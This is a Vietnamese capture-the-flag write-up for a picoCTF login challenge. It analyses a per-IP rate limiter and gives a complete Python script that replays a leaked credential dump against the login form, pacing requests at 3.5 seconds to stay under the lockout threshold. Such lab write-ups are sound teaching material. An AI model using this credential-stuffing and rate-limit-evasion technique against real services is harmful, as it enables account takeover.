<img width="915" height="489" alt="image" src="https://github.com/user-attachments/assets/7ea40a63-92ff-4f2b-af33-03c895332b22" />

\- Đầu tiên, tải file [source code](https://challenge-files.picoctf.net/c_candy_mountain/cd357c3e3dc69a659c955682ce549186d51178f07e25961c971e08bee78bca19/app.py) và [credential dump](https://challenge-files.picoctf.net/c_candy_mountain/cd357c3e3dc69a659c955682ce549186d51178f07e25961c971e08bee78bca19/creds-dump.txt) mà bài cho

\- Nhận thấy đây lại là một bài brute-force với mật khẩu cho trước, thế như khi đọc `app.py`, ta thấy ứng dụng đã có cơ chế rate limit: Nếu gửi quá 10 request trong 30 giây, IP của bạn sẽ bay vào black list trong 120 giây
```
MAX_REQUESTS = 10      # max failed attempts before a user is locked out
EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)
LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)

RATE_LIMITED_HTML = "<h1>Rate Limited Exceeded</h1><p>You have sent too many requests, requests from your IP will be temporarily blocked.</p>"
```

\- Nhận thấy cơ chế này khá dễ bypass do các tool hiện tại hỗ trợ `Delay between requests`

$\implies$ gửi 1 request mỗi 3.5 giây (8 request mỗi 30 giây)

\- Tiến hành xây dựng 1 python script với chức năng tách credentials theo dấu ';' thành từng gói dữ liệu và gửi vào endpoint đăng nhập

<details>
  <summary>pico.py</summary>

  ```
import requests
import time
import os

HOST = "http://candy-mountain.picoctf.net:60603" 
LOGIN_URL = f"{HOST}/login"

script_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(script_dir, "creds-dump.txt")

DELAY = 3.5 

print("[+] Starting Brute-force...")
with open(file_path) as f:
    for line in f:
        username, password = line.strip().split(";")
        
        session = requests.Session()
        data = {
            "username": username,
            "password": password
        }

        try:
            print(f"[*] Trying: {username}:{password}")
            
            # Cho phép điều hướng và biến r là trang đích sau khi redirect (nếu đúng credentials)
            r = session.post(LOGIN_URL, data=data, allow_redirects=True)
            
            # Nếu có thông báo đã vượt mức đăng nhập cho phép
            if "Rate Limited Exceeded" in r.text:
                print("[-] Rate limit hit! Sleeping for 120 seconds...")
                time.sleep(125)
                continue

            # Nếu đăng nhập thành công, tìm trong response có chứa cụm "picoCTF..."
            if "picoCTF{" in r.text:
                print("\n[+] FOUND CREDENTIALS!!!")
                print(f"Username: {username}")
                print(f"Password: {password}")
                print("\nFlag:")
                
                # Trả ra chi tiết của flag
                start_idx = r.text.find("picoCTF{")
                end_idx = r.text.find("}", start_idx) + 1
                if start_idx != -1:
                   print(r.text[start_idx:end_idx])
                
                break
            
            # Bypass rate limit ở đây, giãn khoảng thời gian sau mỗi lần gửi request
            time.sleep(DELAY)

        except requests.exceptions.RequestException as e:
            print("[!] Connection Error:", e)
            print("[!] Retrying in 5 seconds...")
            time.sleep(5)
```
</details>

\- Chạy trực tiếp file .py này trên IDE, và đợi kết quả:

<img width="489" height="132" alt="image" src="https://github.com/user-attachments/assets/42c5fd2a-d227-4a6c-ad7e-d8bc0c821638" />

## Flow của cơ chế Rate Limit
<details>
  <summary>Relevant Source Code</summary>

  ```
""" Updates the request rates db for a given client ip, since information will likely be stale."""
def refresh_request_rates_db(client_ip):
    curr_time = time.time()
    if client_ip not in request_rates:
        return
    
    # check if attempt interval has elapsed, if so sets it to 0
    epoch_start_time = request_rates[client_ip]["epoch_start"] 
    if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
        request_rates[client_ip]["epoch_start"] = -1
    
    # if was locked out but period ended update store
    lockout_end = request_rates[client_ip]["lockout_until"]
    if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1

   
"""For a given user IP, checks how many requests the user has made (by updating the storage) and if 
the user it has exceeded the assigned rate limit.  Returns true if the user has exceeded rate limit, 
false otherwise. """
def exceeded_rate_limit() -> bool:          # Could do a daemon, but since checks of status are always done before updating its not really necessary
    curr_time = time.time()

    # Grab the IP of the client
    client_ip = request.remote_addr
    print(f"Request ip address: {client_ip}", flush=True)

    # refresh & add new entry to db if it doesnt exist
    refresh_request_rates_db(client_ip)            
    if client_ip not in request_rates:
        request_rates[client_ip] = {
            "num_requests": 0,
            "epoch_start": -1,
            "lockout_until": -1
        }
        print(f"New entry added to db", flush=True)

    # log request if it was a POST
    if request.method == "POST":
        request_rates[client_ip]['num_requests'] += 1
        # if epoch hasnt started, set epoch
        if request_rates[client_ip]['epoch_start'] == -1:
             request_rates[client_ip]['epoch_start'] = curr_time
        print(f"DB updated - {client_ip}:{request_rates[client_ip]}", flush=True)

    # check if we exceeded rate threshold, return True if so
    if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
        if request_rates[client_ip]["lockout_until"] == -1:
            request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
            print("Account locked out")
            print(f"DB - {client_ip}:{request_rates[client_ip]}", flush=True)
        return True

    return False
```
  
</details>

1. Lấy IP của người dùng

`client_ip = request.remote_addr`

2. Hàm `refresh_request_rates_db(client_ip)`:
 - Nếu thời gian bắt đầu gửi request đến thời gian hiện tại vượt quá 30 giây  (*EPOCH_DURATION = 30*), thì cập nhật số request=0, tiếp tục có thể brute-force

3. Cộng dồn số lần thử

```
if request.method == "POST":
     request_rates[client_ip]['num_requests'] += 1
```
4. Kiểm tra và chặn IP
```
 if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
     if request_rates[client_ip]["lockout_until"] == -1:
         request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
     return True
```
- Nếu số request gửi đi lớn hơn `MAX_REQUESTS` (*10*) thì server sẽ thiết lập hàm khoá, trả về `True` để xác nhận đã Exceed Rate limit

Hàm `exceeded_rate_limit()` này được gọi ở ngay đầu mỗi trang (/login, /, /logout). Chỉ cần nó trả về True thì ứng dụng lập tức từ chối bất kì request nào trong 120 giây tiếp theo
